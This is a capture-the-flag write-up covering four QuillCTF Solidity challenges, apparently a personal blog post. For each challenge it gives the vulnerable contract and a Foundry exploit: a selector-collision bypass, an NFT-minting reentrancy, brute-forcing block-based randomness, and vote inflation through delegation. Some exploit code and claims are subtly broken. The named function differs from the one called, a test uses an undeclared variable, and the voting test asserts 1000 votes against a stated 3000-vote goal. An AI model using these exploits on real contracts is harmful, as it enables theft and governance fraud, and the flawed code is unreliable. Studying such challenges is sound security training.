---
title: QuillCTF-Last 14 Challenges
date: 2024-01-23 09:51:25
tags:
categories: 
    - QuillCTF
---

# 13-Donate

```
Hey, why not become the Keeper of the Donation? 😉
```

## Objective

- Initially, you are a hacker. Not the owner or the keeper of Donate contract. The purpose is to call `keeperCheck()` Function and get true;

## Code

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

contract Donate {
    event t1(bytes _sig);
    address payable public keeper;
    address public owner;
    event newDonate(address indexed, uint amount);

    modifier onlyOwner() {
        require(
            msg.sender == owner || msg.sender == address(this),
            "You are not Owner"
        );
        _;
    }

    constructor(address _keeper) {
        keeper = payable(_keeper);
        owner = msg.sender;
    }

    function pay() external payable {
        keeper.transfer(msg.value);
        emit newDonate(msg.sender, msg.value);
    }

    function changeKeeper(address _newKeeper) external onlyOwner {
        keeper = payable(_newKeeper);
    }

    function secretFunction(string memory f) external {
        require(
            keccak256(bytes(f)) !=
                0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,
            "invalid"
        );
        (bool success, ) = address(this).call(
            abi.encodeWithSignature(f, msg.sender)
        );
        require(success, "call fail");
    }

    function keeperCheck() external view returns (bool) {
        return (msg.sender == keeper);
    }
}
```

## Observation

To call `keeperCheck()` and make it return ture, we need to be the keeper .

we can see the `changeKeeper()` is onlyOwner , so we need to find another way.

In `secretFunction()` the require
```
require(keccak256(bytes(f)) !=  0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,"invalid");
```
=>
```
0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428 = changeKeeper(address)
```

Does it really prevent us from calling `changeKeeper()`? Not really.

We all know that functions are called based on function selector, which is just the first 4 bytes of the keccak256 of its signature. That is, we can call some random function signature to trigger a call to `changeKeeper()`, as long as their function selectors match.

To find a suitable function name with same function selector as `changeKeeper()` -> `0x09779838`, I used Database:
![[Pasted image 20240130140521.png]]

we find the `refundETH()`.

## Attack
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/Donate/Donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
        // Hack Time
        console.log(address(donate.keeper()));
        donate.secretFunction("refundETHAll(address)");
        console.log(address(donate.keeper()));
        console.log(address(hacker));
    }
}
```

# 16-Gold-NFT

```
You are a magician, Just wave your wand and magically bypass the password required to mint these NFTs.
```

## Objective

- Retrieve the password from IPassManager and mint at least 10 NFTs.

## Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";

interface IPassManager {
    function read(bytes32) external returns (bool);
}

contract GoldNFT is ERC721("GoldNFT", "GoldNFT") {
    uint lastTokenId;
    bool minted;

    function takeONEnft(bytes32 password) external {
        require(
            IPassManager(0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2).read(
                password
            ),
            "wrong pass"
        );

        if (!minted) {
            lastTokenId++;
            _safeMint(msg.sender, lastTokenId);
            minted = true;
        } else revert("already minted");
    }
}
```

## Observation

The contract will call `read()` on `0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2` in goerli.

If we decompile it we will find it just taking that password as the storage slot and read a boolean from that slot.

On the contract creation transaction, we can see that the storage slot `0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe` is changed to `0x0000000000000000000000000000000000000000000000000000000000000001`

So we can just set our password to `0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe`

Because it have a `if (!minted)` check , we need use reentrancy to attack it .

## Attack
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "./GoldNFT.sol";

contract HackGoldNft {
    uint256 i;

    function exploit(address addr) external {
        GoldNFT(addr).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        for (uint256 id = 1; id < 11; ++id) {
            GoldNFT(addr).transferFrom(address(this), msg.sender, id);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        i += 1;
        if (i < 11) {
            GoldNFT(msg.sender).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }
        return this.onERC721Received.selector;
    }
}
```

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT/GoldNFT.sol";
import "../src/GoldNFT/HackGoldNft.sol";

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866);
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        // solution
        exp = new HackGoldNft();
        exp.exploit(address(nft));
        assertEq(nft.balanceOf(hacker), 10);
    }
}
```
# 19-Predictable-nft

```
Generating random numbers was difficult before the Oracles. People had to simulate randomness using built-in variables like `sha3(block.number)`.
```

## Objective

- In this game, you can spend 1 ether to "mint" an NFT token with 3 possible ranks: Common(1), Rare(2), and Superior(3). As a hacker, your goal is to always mint the Superior ones.

## Code

its only give the address on the goerli , we need decompile it .
```
0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC
```

dedaub:
```
// Decompiled by library.dedaub.com
// 2024.01.09 05:53 UTC
// Compiled using the solidity compiler version 0.8.19


// Data structures and variables inferred from the use of storage instructions
uint256 _id; // STORAGE[0x0]
mapping (uint256 => uint256) _tokens; // STORAGE[0x1]



function function_selector() public payable { 
    revert();
}

function mint() public payable { 
    require(10 ** 18 == msg.value, Error('show me the money'));
    require(_id <= 1 + _id, Panic(17)); // arithmetic overflow or underflow
    _id += 1;
    require(100, Panic(18)); // division by zero
    if (keccak256(_id, msg.sender, block.number) % 100 <= 90) {
        if (keccak256(_id, msg.sender, block.number) % 100 <= 80) {
            v0 = v1 = 1;
        } else {
            v0 = v2 = 2;
        }
    } else {
        v0 = v3 = 3;
    }
    _tokens[_id] = v0;
    return _id;
}

function tokens(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return _tokens[varg0];
}

function id() public nonPayable { 
    return _id;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function function_selector( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (0x1249c58b == function_selector >> 224) {
            mint();
        } else if (0x4f64b2be == function_selector >> 224) {
            tokens(uint256);
        } else if (0xaf640d0f == function_selector >> 224) {
            id();
        }
    }
    fallback();
}
```

## Observation

Our objective is to always mint the superior ones . which means to mint type 3 NFTs.

Our main focus is the `mint()` fn. The first `if` statement checks wether `uint256` of `keccak256` of hash `_id, msg.sender, block.number` parameters has the last `2` digits are less than or equal to `90` if so then it checks if it’s less than or equal to `80` or not. If so then mint type `1` else mint type `2` or if none of those mint `3`. So we have to check if the unsigned int has the last 2 digits greater than `90`, only then we can mint type `3` NFTs.

## Attack

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/INFT.sol";
import "forge-std/console.sol";

interface INFT {
    function mint() external payable;
    function tokens(uint256 _id) external view returns (uint256);
    function id() external view returns (uint256);
}

contract PredictableNFTTest is Test {
    INFT nft;
    address hacker = address(0x1337);
    function setUp() public {
        vm.createSelectFork(
            "https://goerli.infura.io/v3/<api_key>"
        );
        vm.deal(hacker, 1 ether);
        nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
    }
    function test() public {
        vm.startPrank(hacker);
        uint mintedId;
        uint currentBlockNum = block.number;
        // console.log(msg.sender);
        // console.log(address(hacker));
        mintedId = nft.id();
        // console.log(mintedId);
        // Mint a Superior one, and do it within the next 100 blocks.
        for (uint i = 0; i < 100; i++) {
            vm.roll(currentBlockNum);
            // ---- hacking time ----
            uint256 jadu = uint256(
                keccak256(
                    abi.encode(mintedId + 1, address(hacker), block.number)
                )
            );
            if (jadu % 100 > 90) {
                nft.mint{value: 1 ether}();
                console.log("Minted ID: ", nft.id());
                console.log("Minted Rank: ", nft.tokens(nft.id()));
                break;
            }
            currentBlockNum++;
        }
        mintedId = nft.id();
        uint mintedRank = nft.tokens(mintedId);
        assertEq(mintedRank, 3, "not Superior(rank != 3)");
    }
}
```
Why use abi.encode?
 That’s because `abi.encodePacked` does’t add any padding & if 2 dynamic data types are together then it can lead to `hash collision` to high probability the original contract haven’t used this.


# 20-VotingMachine
---

```
vToken is a governance token that allows holders to vote on proposals for the community. As a hacker, you have proposed a malicious proposal and now you need 3000 votes to get it accepted in your favor.
```

## Objective

- Accumulate at least 3000 votes in your hacker address. You don’t have any tokens in your wallet.

- After trying all attempts and failing, you decided to perform a phishing attack and you successfully obtained the private keys from three users: Alice , Bob, and Carl.

- Fortunately, Alice had 1000 vTokens, but Bob and Carl don’t have any tokens in their accounts. (see foundry setUp)

- Now that you have access to the private keys of Alice, Bob, and Carl's accounts. So, try again.

## Code

```solidity
pragma solidity 0.8.12;

import "@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract VoteToken is ERC20("Vote Token", "vToken") {

    address public owner;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }

    function burn(address _from, uint256 _amount) public onlyOwner {
        _burn(_from, _amount);
        _moveDelegates(_delegates[_from], address(0), _amount);
    }


    mapping(address => address) internal _delegates;

    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }


    function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            if (from != address(0)) {
                uint32 fromNum = numCheckpoints[from];
                uint256 fromOld = fromNum > 0 ? checkpoints[from][fromNum - 1].votes : 0;
                uint256 fromNew = fromOld - amount;
                _writeCheckpoint(from, fromNum, fromOld, fromNew);
            }

            if (to != address(0)) {
                uint32 toNum = numCheckpoints[to];
                uint256 toOld = toNum > 0 ? checkpoints[to][toNum - 1].votes : 0;
                uint256 toNew = toOld + amount;
                _writeCheckpoint(to, toNum, toOld, toNew);
            }
        }
    }

    mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
    mapping(address => uint32) public numCheckpoints;

    function delegates(address _addr) external view returns (address) {
        return _delegates[_addr];
    }

    function delegate(address _addr) external {
        return _delegate(msg.sender, _addr);
    }


    function getVotes(address _addr) external view returns (uint256) {
        uint32 nCheckpoints = numCheckpoints[_addr];
        return nCheckpoints > 0 ? checkpoints[_addr][nCheckpoints - 1].votes : 0;
    }

    function _delegate(address _addr, address delegatee) internal {
        address currentDelegate = _delegates[_addr];
        uint256 _addrBalance = balanceOf(_addr);
        _delegates[_addr] = delegatee;
        _moveDelegates(currentDelegate, delegatee, _addrBalance);
    }


    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {
        uint32 blockNumber = uint32(block.number);

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }
    }
}
```

## Observation

Through the foundrySetup code ,we can see that we have the private key of 4 accounts `alice` `bob` `carl` and `hacker` . `Alice` have 1000 vTokens.

The Objective is Hacker need to have 3000 Votes and 1000 vTokens.
We can easily have 1000 vTokens ,but how can we get 3000 Votes.

we can find `delegate` function ,it call `_delegate` and then call the `_moveDelegates` -> `_writeCheckpoint`.It can be seen that whenever any user calls `delegate` function it overwrites the current delegation settings with the new given `delegatee` address.

But we can not call this function three times.it does not work.

After read the contract i found that the `getVotes` function does not check the `checkpoints` is valid or not .so we can do simple transfer from four account!!!

## Attack
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/Voting-machine/VotingMachine.sol";

contract exploitTest is Test {
    VoteToken vToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carl = address(3);

    function setUp() public {
        vm.startPrank(owner);
        vToken = new VoteToken();
        vToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploitVote() public {
        // soluiton
        vToken.delegate(hacker);
        vToken.transfer(bob, vToken.balanceOf(alice));

        vm.stopPrank();

        vm.startPrank(bob);
        vToken.delegate(hacker);
        vToken.transfer(carl, vToken.balanceOf(bob));

        vm.stopPrank();

        vm.startPrank(carl);
        vToken.delegate(hacker);
        vToken.transfer(hacker, vToken.balanceOf(carl));

        vm.stopPrank();

        uint256 hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint256 hacker_balance = vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 1000);
        assertEq(hacker_balance, 1000);
    }
}
```